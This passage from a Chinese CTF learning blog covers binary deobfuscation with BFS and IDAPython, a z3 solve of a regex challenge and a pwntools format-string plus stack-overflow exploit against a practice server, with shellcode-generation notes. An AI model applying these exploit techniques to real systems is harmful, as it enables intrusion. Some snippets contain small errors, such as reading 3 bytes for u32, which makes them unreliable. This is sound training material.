取出队头元素</span></span><br><span class="line">        notes = grap[ver]  <span class="comment"># 查看grep里面的key,对应的邻接点</span></span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> notes:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> q <span class="keyword">in</span> seen:      <span class="comment">#从这开始均为本人修改</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> q ==<span class="number">9177</span>:</span><br><span class="line">               </span><br><span class="line">                parent[q]=ver</span><br><span class="line">                seen.add(q)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> q <span class="keyword">in</span> exclusive_nodes:</span><br><span class="line">                nex=grap[q][<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> nex <span class="keyword">in</span> seen:   <span class="comment">#这句话卡了作者两个小时</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                parent[nex]=q</span><br><span class="line">                parent[q]=ver</span><br><span class="line">                </span><br><span class="line">                seen.add(q)</span><br><span class="line">                seen.add(nex)</span><br><span class="line">                queue.append(nex)</span><br><span class="line">            <span class="keyword">if</span> q <span class="keyword">not</span> <span class="keyword">in</span> exclusive_nodes:</span><br><span class="line">               </span><br><span class="line">                parent[q] = ver</span><br><span class="line">                seen.add(q)</span><br><span class="line">                queue.append(q)</span><br><span class="line">    <span class="keyword">return</span> parent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parent = BFS(graph, first)</span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">a = end</span><br><span class="line"><span class="keyword">while</span> a != <span class="literal">None</span>:</span><br><span class="line">    p.append(a)</span><br><span class="line">    a = parent[a]</span><br><span class="line">path = p</span><br><span class="line">path=path[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>关于BFS算法，读者可以自行百度搜索，原作者doctor3在这里的注释已经很详细了。</p><p>本人对这个BFS算法进行总结：通过BFS算法找到从起始点到所有节点的最短路径，parent字典用来记录，在最短路径的情况下，是由哪个节点（父节点）到达当前节点的。</p><p>记录完之后，再通过一个循环来找到从终点是如何到达起点的，即先找到终点的父节点，再找到终点父节点的父节点……知道找到起点。</p><p>也就是说path中的内容是逆序的。</p><p>最后得path逆序一下path&#x3D;path[::-1]。</p><p>但要注意的是，如何处理jmp块，显然，我们在走到jmp时应该加入队列的是jmp块的后继块，而非jmp块。（这里原作者doctor3的wp里有问题，没有处理jmp块）（作者我调了一晚上 哭死）</p><p>第三部分，是打印路径。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;路径: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(path) - <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> path[i] <span class="keyword">not</span> <span class="keyword">in</span> exclusive_nodes <span class="keyword">and</span> path[i] != <span class="number">5376</span>: <span class="comment"># 5376=0x1500 起点</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">next</span> = path[i + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> (jmp_dict[path[i]][<span class="number">1</span>] == <span class="built_in">next</span> <span class="keyword">and</span> jmp_dict[path[i]][<span class="number">0</span>] == <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (jmp_dict[path[i]][<span class="number">1</span>] != <span class="built_in">next</span> <span class="keyword">and</span> jmp_dict[path[i]][<span class="number">0</span>] == <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (jmp_dict[path[i]][<span class="number">1</span>] == <span class="built_in">next</span> <span class="keyword">and</span> jmp_dict[path[i]][<span class="number">0</span>] == <span class="number">2</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (jmp_dict[path[i]][<span class="number">1</span>] != <span class="built_in">next</span> <span class="keyword">and</span> jmp_dict[path[i]][<span class="number">0</span>] == <span class="number">2</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERR&quot;</span>)</span><br></pre></td></tr></table></figure><p>第一句print是打印最短路径上每个节点的地址值。</p><p>之后这个循环，则是打印结果。</p><p>但是这里的for循环中的四个if处理了各种情况。</p><p>我们简单解说一下。</p><p>还记得我们之前的jmp_dict记录的只是jnz和jz吗？如果看到ida的流程图就知道后继块不只有jnz和jz，还有紧跟着的块。第一个if条件是，当前的节点下一步与jmp记录的意义，且是jnz跳过来的，那么就应该打印1，第二个if是，如果当前块与jmp块记录的不一样，且jmp块记录的是jnz，那么说明下一步应该是jnz相反的，也就是0。</p><h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><p>这里记录一下一些我自己写的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">startaddr=<span class="number">0x401210</span></span><br><span class="line">endaddr=<span class="number">0x41DDB2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr):</span><br><span class="line">    a=idc.get_wide_dword(i)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0xe5894855</span>:</span><br><span class="line">        <span class="keyword">if</span> idaapi.get_func(i):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idaapi.add_func(i)</span><br><span class="line">            <span class="comment"># 批量创建函数</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">addr=<span class="number">0x12A4</span>+<span class="number">96</span></span><br><span class="line">startaddr=addr+<span class="number">128</span>*<span class="number">32</span></span><br><span class="line">endaddr=addr+<span class="number">128</span>*<span class="number">127</span></span><br><span class="line">cha=<span class="built_in">chr</span>(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr,<span class="number">128</span>):</span><br><span class="line">    func_name=<span class="string">&quot;func_&#123;0&#125;_&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(cha),cha)</span><br><span class="line">    idc.set_name(i,func_name,<span class="number">256</span>)</span><br><span class="line">    <span class="built_in">print</span>(func_name,<span class="built_in">hex</span>(i))</span><br><span class="line">    cha=<span class="built_in">chr</span>(<span class="built_in">ord</span>(cha)+<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#快速给函数重命名</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line">startaddr=<span class="number">0x11C9</span></span><br><span class="line">endaddr=<span class="number">0x15AE</span></span><br><span class="line">lis=[<span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5B</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xC3</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5C</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x18</span>,<span class="number">0xC3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr):</span><br><span class="line">    flag=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,i+<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">if</span> idc.get_wide_byte(j)!=lis[j-i]:</span><br><span class="line">            flag=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> flag==<span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(i,i+<span class="number">27</span>):</span><br><span class="line">            idc.patch_byte(addr,<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr):<span class="comment"># 将这段全部取消定义（U）</span></span><br><span class="line">    idc.del_items(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startaddr,endaddr): <span class="comment">#如果这条指令时endbr64,就定义函数（P）</span></span><br><span class="line">    <span class="keyword">if</span> idc.get_wide_dword(i)==<span class="number">0xFA1E0FF3</span>: <span class="comment">#endbr64</span></span><br><span class="line">        idaapi.add_func(i)</span><br><span class="line"><span class="comment"># iDA快速去除花指令之后定义函数</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idapython </tag>
            
            <tag> bfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些有意思的考点</title>
      <link href="/2023/08/09/2023-08-09-knowledgeable/"/>
      <url>/2023/08/09/2023-08-09-knowledgeable/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文记录一下打国外比赛或者自己做题时遇到的一些有意思的考点知识。</p><blockquote><p><a href="https://github.com/tgrddf55/any/tree/main/challenges">https://github.com/tgrddf55/any/tree/main/challenges</a></p></blockquote><h1 id="2023-08-07-LITCTF"><a href="#2023-08-07-LITCTF" class="headerlink" title="2023-08-07 LITCTF"></a>2023-08-07 LITCTF</h1><ol><li>obf.py</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(b64decode(<span class="built_in">eval</span>(<span class="string">&#x27;\x74\x72\x75\x73\x74&#x27;</span>)),<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure><p>python中 compile的用法   字符串混淆方法    import  as修改名称</p><ol start="2"><li><p>budget-mc</p><p>题目是在远端服务器上运行的，因此这里的flag.txt在本地是无法看到的</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20230809170416414.png" alt="image-20230809170416414"></p></li></ol><p>题目本身是一个带有重力的二维游戏</p><p><img src="/../imgs/202308091706378.png" alt="image-20230809170559194"></p><p>程序中开了一个数组，用一维数组来表示二维数组，向上走只能通过改变当前元素值为1。程序中唯一可以显示元素值的是</p><p><img src="/../imgs/202308091710891.png" alt="image-20230809171009319"></p><p>看起来程序没有地方直接输出flag，我们要想获得flag只能依据这个数组和flag数组的位置关系，通过类似于pwn的方式来越界访问数组，从而获取flag。</p><p>3.regex</p><p>（正则表达式的学习）  比赛的时候没来得及做，赛后做的</p><p>题目原文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^LITCTF\&#123;(?&lt;=(?=.&#123;42&#125;(?!.)).(?=.&#123;24&#125;greg).(?=.&#123;30&#125;gex).&#123;5&#125;)(?=.&#123;4&#125;(.).&#123;19&#125;\1)(?=.&#123;4&#125;(.).&#123;18&#125;\2)(?=.&#123;6&#125;(.).&#123;2&#125;\3)(?=.&#123;3&#125;(.).&#123;11&#125;\4)(?=.&#123;3&#125;(.).&#123;3&#125;\5)(?=.&#123;16&#125;(.).&#123;4&#125;\6)(?=.&#123;27&#125;(.).&#123;4&#125;\7)(?=.&#123;12&#125;(.).&#123;4&#125;\8)(?=.&#123;3&#125;(.).&#123;8&#125;\9)(?=.&#123;18&#125;(.).&#123;2&#125;\10)(?=.&#123;4&#125;(.).&#123;20&#125;\11)(?=.&#123;11&#125;(.).&#123;2&#125;\12)(?=.&#123;32&#125;(.).&#123;0&#125;\13)(?=.&#123;3&#125;(.).&#123;24&#125;\14)(?=.&#123;12&#125;(.).&#123;9&#125;\15)(?=.&#123;7&#125;(.).&#123;2&#125;\16)(?=.&#123;0&#125;(.).&#123;12&#125;\17)(?=.&#123;13&#125;(.).&#123;5&#125;\18)(?=.&#123;1&#125;(.).&#123;0&#125;\19)(?=.&#123;27&#125;(.).&#123;3&#125;\20)(?=.&#123;8&#125;(.).&#123;17&#125;\21)(?=.&#123;16&#125;(.).&#123;6&#125;\22)(?=.&#123;6&#125;(.).&#123;6&#125;\23)(?=.&#123;0&#125;(.).&#123;1&#125;\24)(?=.&#123;8&#125;(.).&#123;11&#125;\25)(?=.&#123;5&#125;(.).&#123;16&#125;\26)(?=.&#123;29&#125;(.).&#123;1&#125;\27)(?=.&#123;4&#125;(.).&#123;9&#125;\28)(?=.&#123;5&#125;(.).&#123;24&#125;\29)(?=.&#123;15&#125;(.).&#123;10&#125;\30).*&#125;$</span><br></pre></td></tr></table></figure><p>之前仅仅只是知道正则表达式这个名字，现在才具体学习了一下正则表达式的规则。</p><p>主要讲解一下<code>(?&lt;=(?=.&#123;42&#125;(?!.)).(?=.&#123;24&#125;greg).(?=.&#123;30&#125;gex).&#123;5&#125;)</code>这一段内容，来加深理解一下零宽断言。首先要先划分层次，</p><p><code>( ?&lt;=  (?=.&#123;42&#125;(?!.) ) . (?=.&#123;24&#125;greg) . (?=.&#123;30&#125;gex) .&#123;5&#125;  )</code></p><p>我们逐层分析。最外层的零宽断言去掉后是</p><p><code>(?=.&#123;42&#125;(?!.) ) . (?=.&#123;24&#125;greg) . (?=.&#123;30&#125;gex) .&#123;5&#125;</code></p><p>这样的零宽断言是并列的形式分别是</p><p><code>(?=.&#123;42&#125;(?!.) )</code>  <code>.</code>      <code>(?=.&#123;24&#125;greg)</code>     <code>.</code>       <code>(?=.&#123;30&#125;gex)</code>      <code>.&#123;5&#125;</code></p><p>这几部分</p><p>第一小部分又嵌套了一个零宽断言，(?!.)意思是后面没有任何字符，那么.{42}(?!.)的意思就是四十二个字符之后没有任何字符，(?&#x3D;.{42}(?!.) )就是表示有一个零宽位置（夹在两个字符中间的位置，不算字符）后面跟着42个字符，并且42个字符后没有别的字符。</p><p>第二部分是一个通配符，也就是任意字符。</p><p>第三部分<code>(?=.&#123;24&#125;greg)</code>意思就是一个零宽位置，后面跟着24个字符并且紧跟着greg这四个字母。</p><p>第四部分是一个通配符。</p><p>第五部分<code>(?=.&#123;30&#125;gex)</code> 意思就是有一个零宽位置，后面跟着30个字符并且紧跟着gex这四个字母。</p><p>第六部分<code>.&#123;5&#125;</code>表示五个通配符，也就是五个人资字符。</p><p>我们将这六部分合起来看，就是要有七个字符，这七个字符要满足一些条件，第一个字符前面的零宽位置满足这个零宽位置后面有42个任意字符（显然包括第一个字符），并且之后不再有字符，第一个字符和第二个字符之间的零宽位置要满足，这个零宽位置后面有24个任意字符，之后紧跟着greg四个字符，第二个字符和第三个字符之间的零宽位置要满足这个零宽字符后面有30个任意字符，之后紧跟着gex三个字符，之后从第三个字符到第七个字符都是任意字符。</p><p>再加上最外层的零宽断言<code>(?&lt;=(?=.&#123;42&#125;(?!.)).(?=.&#123;24&#125;greg).(?=.&#123;30&#125;gex).&#123;5&#125;)</code>  意思就是有一个零宽位置，这个零宽位置的左边要有七个字符，这七个字符满足刚才说的那些条件。</p><p>这一部分最麻烦的分析完了，再把前面的加上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^LITCTF\&#123;(?&lt;=(?=.&#123;42&#125;(?!.)).(?=.&#123;24&#125;greg).(?=.&#123;30&#125;gex).&#123;5&#125;)</span><br></pre></td></tr></table></figure><p>^表示开始，\{表示{，那么这一段就是最开始要有LITCTF{这七个字符然后紧跟着一个零宽位置，这个位置的左边要有七个字符，这七个字符满足刚才那些条件。显然后面这个零宽断言中有的七个字符就是LITCTF{，刚刚说的那些条件中第一个字符就是L，第二个字符就是I，第三字符就是C，这些字符周围的零宽位置需要满足一堆条件。记住刚刚七个字符之后紧跟着的零宽位置，这个位置还要满足一些条件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?=.&#123;4&#125;(.).&#123;19&#125;\1)</span><br></pre></td></tr></table></figure><p>后面的不列举了，和这个是一样的。</p><p>刚刚记住的那个零宽位置还要满足一些条件，<code>(?=.&#123;4&#125;(.).&#123;19&#125;\1)</code>   \1表示前面的捕获的分组的重复，我理解的分组就是，原本可以不用加()的地方结果加了，那么这个位置就是分组，在这里指的就是(.) 注意零宽断言的小括号显然不算。这个零宽断言就是有一个零宽位置，后面紧跟着4个任意字符，然后后面又紧跟着一个字符，把这个字符记住，之后又紧跟着19个任意字符，在之后紧跟着一个字符，这个字符和刚刚记住的那个字符需要一致。也就是说这个零宽位置后面的第5个字符和后面的第25个字符要一致。之后的所有零宽断言都是类似这样。这些也是限制条件。</p><p>零宽断言之后还有一些字符 <code>.*&#125;$</code>  .*表示任意个任意字符   } 表示最后有一个}，$表示结束,也就是说最后要以}字符结尾。</p><p>通过刚刚的分析很容易得出答案，下面是我的脚本。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = [Int(<span class="string">&#x27;x%s&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>)]</span><br><span class="line">s=Solver()</span><br><span class="line">ls=[<span class="number">4</span>,<span class="number">19</span>,<span class="number">4</span>,<span class="number">18</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">27</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">18</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">20</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">24</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">16</span>,<span class="number">29</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">24</span>,<span class="number">15</span>,<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">s.add(x[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;I&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">6</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">41</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">25</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">26</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">27</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">28</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">32</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">33</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line">s.add(x[<span class="number">34</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    s.add(  x[ls[<span class="number">2</span>*i]+<span class="number">7</span>] == x[ls[<span class="number">2</span>*i]+<span class="number">8</span>+ls[<span class="number">2</span>*i+<span class="number">1</span>]])</span><br><span class="line">s.check()</span><br><span class="line">flag=s.model()</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    res.append(flag[i])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res=[<span class="number">76</span>, <span class="number">73</span>, <span class="number">84</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">123</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">103</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">120</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    str_flag+=<span class="built_in">chr</span>(res[i])</span><br><span class="line"><span class="built_in">print</span>(str_flag)</span><br><span class="line"><span class="comment"># LITCTF&#123;rrregereeregergegegregegggexexexxx&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串+ret2txt</title>
      <link href="/2023/07/13/2023-07-13-nssctf%E7%9A%84%E4%B8%80%E9%81%93pwn%E9%A2%98%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2+ret2txt/"/>
      <url>/2023/07/13/2023-07-13-nssctf%E7%9A%84%E4%B8%80%E9%81%93pwn%E9%A2%98%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2+ret2txt/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学了格式化字符串的知识，而且想自己独立做一下pwn题，于是就找到了下面的一道题，比较简单</p><blockquote><p><a href="https://www.nssctf.cn/problem/774">https://www.nssctf.cn/problem/774</a></p></blockquote><h1 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h1><p>IDA打开，能够很容易发现程序有一个后门函数,直接cat flag。找到关键漏洞处。</p><p><img src="/../imgs/202307132143851.png" alt="image-20230713214323641"></p><p>先输入format，再打印这个format最后再输入。</p><p>前面是格式化字符串漏洞，后面是栈溢出漏洞。</p><p>但是程序保护全开，pie保护和栈溢出保护都需要想办法绕过。</p><p>pie保护开启了，我们再想通过栈溢出控制程序执行后门函数就没那么简单了，至少需要知道某个指令的地址。</p><p>canary保护的话需要能够泄露出rbp-8位置上的值。</p><p>格式化字符串漏洞都可以帮我们做到，只需要找到canary和ret地址相对于格式化字符串的位置就可以了。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./find_flag&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28795</span>)</span><br><span class="line">payload=<span class="string">b&#x27;AAAAAAAB%17$p%18$p%19$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name? &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">cannary=<span class="built_in">eval</span>(p.recv(<span class="number">18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(cannary))</span><br><span class="line">ret_addr=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;!&#x27;</span>)[-<span class="number">15</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">backdoor=ret_addr-<span class="number">0x242</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(cannary)+p64(cannary)+p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;else? &#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn</title>
      <link href="/2023/07/12/2023-07-12-pwn%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B9/"/>
      <url>/2023/07/12/2023-07-12-pwn%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>目前在0基础学习pwn</p><p>记录一下最近学习过程中遇到的一些知识点</p><h1 id="pwntools的运用细节"><a href="#pwntools的运用细节" class="headerlink" title="pwntools的运用细节"></a>pwntools的运用细节</h1><p>发送 payload</p><p><code>p.send(payload)</code>  发送 payload</p><p><code>p.sendline(payload)</code>  发送 payload，并进行换行（末尾\n）</p><p><code>p.sendafter(some_string, payload)</code>  接收到 some_string 后, 发送你的 payload</p><p><code>p.sendlineafter(some_string, payload)</code>  接收到 some_string 后, 发送你的 payload，加个换行</p><p>接收返回内容</p><p>p.recv() 一直接收输出</p><p><code>p.recvn(N)</code>  接受 N(数字) 字符</p><p><code>p.recvline()</code> 接收一行输出</p><p><code>p.recvlines(N)</code>  接收 N(数字) 行输出</p><p><code>p.recvuntil(some_string)</code>  接收到 some_string 为止</p><p><code>p.interactive()</code>   直接进行交互，相当于回到shell的模式，一般在取得shell之后使用</p><p>生成 shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>上面是抄的别人博客的东西</p><blockquote><p><a href="https://www.yuque.com/hxfqg9/bin/yxegb6">https://www.yuque.com/hxfqg9/bin/yxegb6</a></p></blockquote><p>接下来是自己学到的</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>p.recv(n)等价于p.recv(n)</p><p>一般与p.recvuntil()连用</p><p>假设程序会这样输出：</p><p>“aaaaaaaab\x12\x34\x56\x7f”</p><p>我们想接收到后面4位，将其当做地址，那么可以这样写脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">imp_addr=u32(p.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>此时imp_addr的值就是0x7f563412</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2024.4.11 update</span></span><br><span class="line">r=p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr=u64(r.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>另一种情况程序自身打印了一个地址</p><p>“0x7f563412”</p><p>这时候这个地址是以字符串的形式输出的，我们这时候想要接收数据可以这样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)  <span 